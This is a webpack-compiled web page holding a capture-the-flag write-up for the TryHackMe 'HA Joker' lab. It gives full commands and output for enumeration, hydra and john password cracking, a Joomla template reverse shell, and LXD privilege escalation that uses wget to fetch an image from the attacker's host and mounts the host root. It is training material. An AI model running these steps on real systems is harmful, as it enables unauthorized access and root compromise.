"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[7814],{3905:(t,e,n)=>{n.d(e,{Zo:()=>u,kt:()=>m});var a=n(67294);function r(t,e,n){return e in t?Object.defineProperty(t,e,{value:n,enumerable:!0,configurable:!0,writable:!0}):t[e]=n,t}function o(t,e){var n=Object.keys(t);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(t);e&&(a=a.filter((function(e){return Object.getOwnPropertyDescriptor(t,e).enumerable}))),n.push.apply(n,a)}return n}function s(t){for(var e=1;e<arguments.length;e++){var n=null!=arguments[e]?arguments[e]:{};e%2?o(Object(n),!0).forEach((function(e){r(t,e,n[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(t,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(e){Object.defineProperty(t,e,Object.getOwnPropertyDescriptor(n,e))}))}return t}function i(t,e){if(null==t)return{};var n,a,r=function(t,e){if(null==t)return{};var n,a,r={},o=Object.keys(t);for(a=0;a<o.length;a++)n=o[a],e.indexOf(n)>=0||(r[n]=t[n]);return r}(t,e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(t);for(a=0;a<o.length;a++)n=o[a],e.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(t,n)&&(r[n]=t[n])}return r}var l=a.createContext({}),p=function(t){var e=a.useContext(l),n=e;return t&&(n="function"==typeof t?t(e):s(s({},e),t)),n},u=function(t){var e=p(t.components);return a.createElement(l.Provider,{value:e},t.children)},c="mdxType",h={inlineCode:"code",wrapper:function(t){var e=t.children;return a.createElement(a.Fragment,{},e)}},d=a.forwardRef((function(t,e){var n=t.components,r=t.mdxType,o=t.originalType,l=t.parentName,u=i(t,["components","mdxType","originalType","parentName"]),c=p(n),d=r,m=c["".concat(l,".").concat(d)]||c[d]||h[d]||o;return n?a.createElement(m,s(s({ref:e},u),{},{components:n})):a.createElement(m,s({ref:e},u))}));function m(t,e){var n=arguments,r=e&&e.mdxType;if("string"==typeof t||r){var o=n.length,s=new Array(o);s[0]=d;var i={};for(var l in e)hasOwnProperty.call(e,l)&&(i[l]=e[l]);i.originalType=t,i[c]="string"==typeof t?t:r,s[1]=i;for(var p=2;p<o;p++)s[p]=n[p];return a.createElement.apply(null,s)}return a.createElement.apply(null,n)}d.displayName="MDXCreateElement"},99563:(t,e,n)=>{n.r(e),n.d(e,{assets:()=>l,contentTitle:()=>s,default:()=>h,frontMatter:()=>o,metadata:()=>i,toc:()=>p});var a=n(87462),r=(n(67294),n(3905));const o={},s="HA Joker CTF",i={unversionedId:"Tryhackme/HA Joker CTF/HA Joker CTF",id:"Tryhackme/HA Joker CTF/HA Joker CTF",title:"HA Joker CTF",description:"Batman hits Joker.",source:"@site/writeups/Tryhackme/HA Joker CTF/HA Joker CTF.md",sourceDirName:"Tryhackme/HA Joker CTF",slug:"/Tryhackme/HA Joker CTF/",permalink:"/writeups/Tryhackme/HA Joker CTF/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"GraphQL",permalink:"/writeups/Tryhackme/GraphQL/"},next:{title:"hackerNote",permalink:"/writeups/Tryhackme/HackerNote/"}},l={},p=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 HA Joker CTF",id:"task-1-ha-joker-ctf",level:2}],u={toc:p},c="wrapper";function h(t){let{components:e,...o}=t;return(0,r.kt)(c,(0,a.Z)({},u,o,{components:e,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"ha-joker-ctf"},"HA Joker CTF"),(0,r.kt)("p",null,"Batman hits Joker."),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/jokerctf"},"HA Joker CTF")),(0,r.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,r.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,r.kt)("li",{parentName:"ul"},"Brute Forcing (http-get)"),(0,r.kt)("li",{parentName:"ul"},"Backup Poking"),(0,r.kt)("li",{parentName:"ul"},"Brute Forcing (Zip)"),(0,r.kt)("li",{parentName:"ul"},"Stored Passwords & Keys"),(0,r.kt)("li",{parentName:"ul"},"SQL Enumeration"),(0,r.kt)("li",{parentName:"ul"},"Brute Forcing (Hash)"),(0,r.kt)("li",{parentName:"ul"},"Exploitation (LXC)")),(0,r.kt)("hr",null),(0,r.kt)("h2",{id:"task-1-ha-joker-ctf"},"Task 1 HA Joker CTF"),(0,r.kt)("p",null,"We have developed this lab for the purpose of online penetration practices. Solving this lab is not that tough if you have proper basic knowledge of Penetration testing. Let\u2019s start and learn how to breach it."),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"Enumerate Services")),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Nmap")),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"Bruteforce")),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Performing Bruteforce on files over http"),(0,r.kt)("li",{parentName:"ul"},"Performing Bruteforce on Basic Authentication")),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"Hash Crack")),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Performing Bruteforce on hash to crack zip file"),(0,r.kt)("li",{parentName:"ul"},"Performing Bruteforce on hash to crack mysql user")),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"Exploitation")),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Getting a reverse connection"),(0,r.kt)("li",{parentName:"ul"},"Spawning a TTY Shell")),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"Privilege Escalation")),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Get root taking advantage of flaws in LXD")),(0,r.kt)("hr",null),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/HA Joker CTF$ sudo nmap -p- -sS -sC -sV -O 10.10.252.64\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-08 19:57 CEST\nNmap scan report for 10.10.252.64\nHost is up (0.034s latency).\nNot shown: 65532 closed ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA)\n|   256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA)\n|_  256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (ED25519)\n80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: HA: Joker\n8080/tcp open  http    Apache httpd 2.4.29\n| http-auth:\n| HTTP/1.1 401 Unauthorized\\x0D\n|_  Basic realm=Please enter the password.\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: 401 Unauthorized\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/8%OT=22%CT=1%CU=38238%PV=Y%DS=2%DC=I%G=Y%TM=5F7F533\nOS:1%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=A)OPS\nOS:(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST1\nOS:1NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN\nOS:(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 59.49 seconds\n")),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("p",{parentName:"li"},"Enumerate services on target machine.")),(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("p",{parentName:"li"},"What version of Apache is it?"))),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},"80/tcp open http Apache httpd 2.4.29 ((Ubuntu))")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"2.4.29")),(0,r.kt)("ol",{start:2},(0,r.kt)("li",{parentName:"ol"},"What port on this machine not need to be authenticated by user and password?")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: HA: Joker\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"80")),(0,r.kt)("ol",{start:3},(0,r.kt)("li",{parentName:"ol"},"There is a file on this port that seems to be secret, what is it?")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/HA Joker CTF$ gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.252.64 -x txt,php,html\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.252.64\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     html,txt,php\n[+] Timeout:        10s\n===============================================================\n2020/10/08 20:03:57 Starting gobuster\n===============================================================\n/.hta (Status: 403)\n/.hta.txt (Status: 403)\n/.hta.php (Status: 403)\n/.hta.html (Status: 403)\n/.htaccess (Status: 403)\n/.htaccess.php (Status: 403)\n/.htaccess.html (Status: 403)\n/.htaccess.txt (Status: 403)\n/.htpasswd (Status: 403)\n/.htpasswd.txt (Status: 403)\n/.htpasswd.php (Status: 403)\n/.htpasswd.html (Status: 403)\n/css (Status: 301)\n/img (Status: 301)\n/index.html (Status: 200)\n/index.html (Status: 200)\n/phpinfo.php (Status: 200)\n/phpinfo.php (Status: 200)\n/secret.txt (Status: 200)\n/server-status (Status: 403)\n===============================================================\n2020/10/08 20:05:04 Finished\n===============================================================\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"secret.txt")),(0,r.kt)("ol",{start:5},(0,r.kt)("li",{parentName:"ol"},"There is another file which reveals information of the backend, what is it?")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"phpinfo.php")),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"When reading the secret file, We find with a conversation that seems contains at least two users and some keywords that can be intersting, what user do you think it is?")),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"http://10.10.252.64/secret.txt"},"http://10.10.252.64/secret.txt"))),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'Batman hits Joker.\nJoker: "Bats you may be a rock but you won\'t break me." (Laughs!)\nBatman: "I will break you with this rock. You made a mistake now."\nJoker: "This is one of your 100 poor jokes, when will you get a sense of humor bats! You are dumb as a rock."\nJoker: "HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA!"\n')),(0,r.kt)("ol",{start:2},(0,r.kt)("li",{parentName:"ol"},"What port on this machine need to be authenticated by Basic Authentication Mechanism?")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"8080/tcp open  http    Apache httpd 2.4.29\n| http-auth:\n| HTTP/1.1 401 Unauthorized\\x0D\n|_  Basic realm=Please enter the password.\n")),(0,r.kt)("ol",{start:3},(0,r.kt)("li",{parentName:"ol"},"At this point we have one user and a url that needs to be aunthenticated, brute force it to get the password, what is that password?")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/HA Joker CTF$ hydra -l joker -P /usr/share/wordlists/rockyou.txt -s 8080 10.10.252.64 -m / http-get\nHydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-08 20:10:16\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task\n[DATA] attacking http-get://10.10.252.64:8080/\n[8080][http-get] host: 10.10.252.64   login: joker   password: hannah\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-08 20:10:47\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"hannah")),(0,r.kt)("ol",{start:5},(0,r.kt)("li",{parentName:"ol"},"Yeah!! We got the user and password and we see a cms based blog. Now check for directories and files in this port. What directory looks like as admin directory?")),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"http://10.10.252.64:8080/robots.txt"},"http://10.10.252.64:8080/robots.txt"))),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"# If the Joomla site is installed within a folder\n# eg www.example.com/joomla/ then the robots.txt file\n# MUST be moved to the site root\n# eg www.example.com/robots.txt\n# AND the joomla folder name MUST be prefixed to all of the\n# paths.\n# eg the Disallow rule for the /administrator/ folder MUST\n# be changed to read\n# Disallow: /joomla/administrator/\n#\n# For more information about the robots.txt standard, see:\n# http://www.robotstxt.org/orig.html\n#\n# For syntax checking, see:\n# http://tool.motoricerca.info/robots-checker.phtml\n\nUser-agent: *\nDisallow: /administrator/\nDisallow: /bin/\nDisallow: /cache/\nDisallow: /cli/\nDisallow: /components/\nDisallow: /includes/\nDisallow: /installation/\nDisallow: /language/\nDisallow: /layouts/\nDisallow: /libraries/\nDisallow: /logs/\nDisallow: /modules/\nDisallow: /plugins/\nDisallow: /tmp/\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"/administrator/")),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"We need access to the administration of the site in order to get a shell, there is a backup file, What is this file?")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/HA Joker CTF$ gobuster dir -U joker -P hannah -u http://10.10.252.64:8080/ -x bak,old,tar,gz,tgz,zip,7z -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.252.64:8080/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Auth User:      joker\n[+] Extensions:     gz,tgz,zip,7z,bak,old,tar\n[+] Timeout:        10s\n===============================================================\n2020/10/08 20:33:58 Starting gobuster\n===============================================================\n/.hta (Status: 403)\n/.hta.tgz (Status: 403)\n/.hta.zip (Status: 403)\n/.hta.7z (Status: 403)\n/.hta.bak (Status: 403)\n/.hta.old (Status: 403)\n/.hta.tar (Status: 403)\n/.hta.gz (Status: 403)\n/.htaccess (Status: 403)\n/.htaccess.tar (Status: 403)\n/.htaccess.gz (Status: 403)\n/.htaccess.tgz (Status: 403)\n/.htaccess.zip (Status: 403)\n/.htaccess.7z (Status: 403)\n/.htaccess.bak (Status: 403)\n/.htaccess.old (Status: 403)\n/.htpasswd (Status: 403)\n/.htpasswd.bak (Status: 403)\n/.htpasswd.old (Status: 403)\n/.htpasswd.tar (Status: 403)\n/.htpasswd.gz (Status: 403)\n/.htpasswd.tgz (Status: 403)\n/.htpasswd.zip (Status: 403)\n/.htpasswd.7z (Status: 403)\n/LICENSE (Status: 200)\n/README (Status: 200)\n/administrator (Status: 301)\n/bin (Status: 301)\n/backup (Status: 200)\n/backup.zip (Status: 200)\n/cache (Status: 301)\n/components (Status: 301)\n/images (Status: 301)\n/includes (Status: 301)\n/index.php (Status: 200)\n/language (Status: 301)\n/layouts (Status: 301)\n/libraries (Status: 301)\n/media (Status: 301)\n/modules (Status: 301)\n/plugins (Status: 301)\n/robots (Status: 200)\n/robots.txt (Status: 200)\n^C\n[!] Keyboard interrupt detected, terminating.\n===============================================================\n2020/10/08 20:35:44 Finished\n===============================================================\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"backup.zip\n")),(0,r.kt)("ol",{start:2},(0,r.kt)("li",{parentName:"ol"},"We have the backup file and now we should look for some information, for example database, configuration files, etc ... But the backup file seems to be encrypted. What is the password?")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/HA Joker CTF$ zip2john backup.zip > backup.hash\nkali@kali:~/CTFs/tryhackme/HA Joker CTF$ john backup.hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nWill run 2 OpenMP threads\nProceeding with single, rules:Single\nPress 'q' or Ctrl-C to abort, almost any other key for status\nWarning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.\nAlmost done: Processing the remaining buffered candidate passwords, if any.\nWarning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.\nProceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist\nhannah           (backup.zip)\n1g 0:00:00:00 DONE 2/3 (2020-10-08 20:19) 6.250g/s 501856p/s 501856c/s 501856C/s 123456..Peter\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"hannah")),(0,r.kt)("ol",{start:3},(0,r.kt)("li",{parentName:"ol"},"Remember that... We need access to the administration of the site... Blah blah blah. In our new discovery we see some files that have compromising information, maybe db? ok what if we do a restoration of the database! Some tables must have something like user_table! What is the super duper user?")),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"configuration.php"},"configuration.php")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-php"},"    public $dbtype = 'mysqli';\n    public $host = 'localhost';\n    public $user = 'joomla';\n    public $password = '1234';\n    public $db = 'joomladb';\n    public $dbprefix = 'cc1gr_';\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/HA Joker CTF$ grep CREATE TABLE db/joomladb.sql | grep user\ngrep: TABLE: No such file or directory\ndb/joomladb.sql:CREATE TABLE `cc1gr_user_keys` (\ndb/joomladb.sql:CREATE TABLE `cc1gr_user_notes` (\ndb/joomladb.sql:CREATE TABLE `cc1gr_user_profiles` (\ndb/joomladb.sql:CREATE TABLE `cc1gr_user_usergroup_map` (\ndb/joomladb.sql:CREATE TABLE `cc1gr_usergroups` (\ndb/joomladb.sql:CREATE TABLE `cc1gr_users` (\nkali@kali:~/CTFs/tryhackme/HA Joker CTF$ grep cc1gr_users db/joomladb.sql\n-- Table structure for table `cc1gr_users`\nDROP TABLE IF EXISTS `cc1gr_users`;\nCREATE TABLE `cc1gr_users` (\n-- Dumping data for table `cc1gr_users`\nLOCK TABLES `cc1gr_users` WRITE;\n/*!40000 ALTER TABLE `cc1gr_users` DISABLE KEYS */;\nINSERT INTO `cc1gr_users` VALUES (547,\'Super Duper User\',\'admin\',\'admin@example.com\',\'$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG\',0,1,\'2019-10-08 12:00:15\',\'2019-10-25 15:20:02\',\'0\',\'{\\"admin_style\\":\\"\\",\\"admin_language\\":\\"\\",\\"language\\":\\"\\",\\"editor\\":\\"\\",\\"helpsite\\":\\"\\",\\"timezone\\":\\"\\"}\',\'0000-00-00 00:00:00\',0,\'\',\'\',0);\n/*!40000 ALTER TABLE `cc1gr_users` ENABLE KEYS */;\nkali@kali:~/CTFs/tryhackme/HA Joker CTF$\n')),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"admin")),(0,r.kt)("ol",{start:5},(0,r.kt)("li",{parentName:"ol"},"Super Duper User! What is the password?")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/HA Joker CTF$ john admin.hash /usr/share/wordlists/rockyou.txt --format=bcrypt\nWarning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 1024 for all loaded hashes\nWill run 2 OpenMP threads\nProceeding with single, rules:Single\nPress 'q' or Ctrl-C to abort, almost any other key for status\nAlmost done: Processing the remaining buffered candidate passwords, if any.\nProceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist\nabcd1234         (?)\n1g 0:00:00:09 DONE 2/3 (2020-10-08 20:39) 0.1076g/s 79.44p/s 79.44c/s 79.44C/s yellow..allison\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\nkali@kali:~/CTFs/tryhackme/HA Joker CTF$\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"abcd1234")),(0,r.kt)("ol",{start:7},(0,r.kt)("li",{parentName:"ol"},"At this point, you should be upload a reverse-shell in order to gain shell access. What is the owner of this session?")),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"http://10.10.252.64:8080/administrator/index.php?option=com_templates&view=template&id=503&file=L2Vycm9yLnBocA%3D%3D"},"http://10.10.252.64:8080/administrator/index.php?option=com_templates&view=template&id=503&file=L2Vycm9yLnBocA%3D%3D")),(0,r.kt)("p",null,(0,r.kt)("img",{src:n(40740).Z,width:"1298",height:"713"})),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"http://10.10.252.64:8080/templates/beez3/error.php"},"http://10.10.252.64:8080/templates/beez3/error.php")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/HA Joker CTF$ nc -nlvp 9001\nlistening on [any] 9001 ...\nconnect to [10.8.106.222] from (UNKNOWN) [10.10.252.64] 43184\nLinux ubuntu 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux\n 11:46:07 up 53 min,  0 users,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)\n/bin/sh: 0: can't access tty; job control turned off\n$\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"www-data")),(0,r.kt)("ol",{start:8},(0,r.kt)("li",{parentName:"ol"},"This user belongs to a group that differs on your own group, What is this group?")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"lxd")),(0,r.kt)("ol",{start:10},(0,r.kt)("li",{parentName:"ol"},"Spawn a tty shell.")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"SHELL=/bin/bash script -q /dev/null")),(0,r.kt)("ol",{start:11},(0,r.kt)("li",{parentName:"ol"},'In this question you should be do a basic research on how linux containers (LXD) work, it has a small online tutorial. Googling "lxd try it online".')),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://linuxcontainers.org/lxd/introduction/"},"https://linuxcontainers.org/lxd/introduction/")),(0,r.kt)("ol",{start:13},(0,r.kt)("li",{parentName:"ol"},"Research how to escalate privileges using LXD permissions and check to see if there are any images available on the box.")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"www-data@ubuntu:/$ cd ~\ncd ~\nwww-data@ubuntu:/var/www$ wget http://10.8.106.222/alpine-v3.12-x86_64-20201008_2055.tar.gz\n<.8.106.222/alpine-v3.12-x86_64-20201008_2055.tar.gz\n--2020-10-08 11:58:36--  http://10.8.106.222/alpine-v3.12-x86_64-20201008_2055.tar.gz\nConnecting to 10.8.106.222:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 3183740 (3.0M) [application/gzip]\nSaving to: 'alpine-v3.12-x86_64-20201008_2055.tar.gz'\n2020-10-08 11:58:38 (1.56 MB/s) - 'alpine-v3.12-x86_64-20201008_2055.tar.gz' saved [3183740/3183740]\nwww-data@ubuntu:/var/www$ lxc image import alpine-v3.12-x86_64-20201008_2055.tar.gz  --alias myalpine\n<v3.12-x86_64-20201008_2055.tar.gz  --alias myalpine\nwww-data@ubuntu:/var/www$ lxc image list\nlxc image list\n+----------+--------------+--------+-------------------------------+--------+--------+-----------------------------+\n|  ALIAS   | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |\n+----------+--------------+--------+-------------------------------+--------+--------+-----------------------------+\n| myalpine | f2a9284c04f4 | no     | alpine v3.12 (20201008_20:55) | x86_64 | 3.04MB | Oct 8, 2020 at 6:59pm (UTC) |\n+----------+--------------+--------+-------------------------------+--------+--------+-----------------------------+\nwww-data@ubuntu:/var/www$\n")),(0,r.kt)("ol",{start:14},(0,r.kt)("li",{parentName:"ol"},"The idea here is to mount the root of the OS file system on the container, this should give us access to the root directory. Create the container with the privilege true and mount the root file system on /mnt in order to gain access to /root directory on host machine.")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"www-data@ubuntu:/var/www$ lxc image import alpine-v3.12-x86_64-20200623_1255.tar.gz --alias myalpine\n<-v3.12-x86_64-20200623_1255.tar.gz --alias myalpine\nError: open alpine-v3.12-x86_64-20200623_1255.tar.gz: no such file or directory\nwww-data@ubuntu:/var/www$ ls\nls\nalpine-v3.12-x86_64-20201008_2055.tar.gz  html\nwww-data@ubuntu:/var/www$ lxc image import alpine-v3.12-x86_64-20201008_2055.tar.gz  --alias myalpine\n<v3.12-x86_64-20201008_2055.tar.gz  --alias myalpine\nwww-data@ubuntu:/var/www$ lxc image list\nlxc image list\n+----------+--------------+--------+-------------------------------+--------+--------+-----------------------------+\n|  ALIAS   | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |\n+----------+--------------+--------+-------------------------------+--------+--------+-----------------------------+\n| myalpine | f2a9284c04f4 | no     | alpine v3.12 (20201008_20:55) | x86_64 | 3.04MB | Oct 8, 2020 at 6:59pm (UTC) |\n+----------+--------------+--------+-------------------------------+--------+--------+-----------------------------+\nwww-data@ubuntu:/var/www$ lxc init myalpine joker -c security.privileged=true\nlxc init myalpine joker -c security.privileged=true\nCreating joker\nwww-data@ubuntu:/var/www$ lxc config device add joker mydevice disk source=/ path=/mnt/root recursive=true\n<ydevice disk source=/ path=/mnt/root recursive=true\nDevice mydevice added to joker\nwww-data@ubuntu:/var/www$ lxc start joker\nlxc start joker\nwww-data@ubuntu:/var/www$ lxc exec joker /bin/sh\nlxc exec joker /bin/sh\n")),(0,r.kt)("ol",{start:15},(0,r.kt)("li",{parentName:"ol"},"What is the name of the file in the /root directory?")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"~ # ^[[26;5Rcat /mnt/root/root/final.txt\ncat /mnt/root/root/final.txt\n\n     \u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557  \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557\n     \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2554\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\n     \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\n\u2588\u2588   \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2588\u2588\u2557 \u2588\u2588\u2554\u2550\u2550\u255d  \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\n\u255a\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551  \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551\n \u255a\u2550\u2550\u2550\u2550\u255d  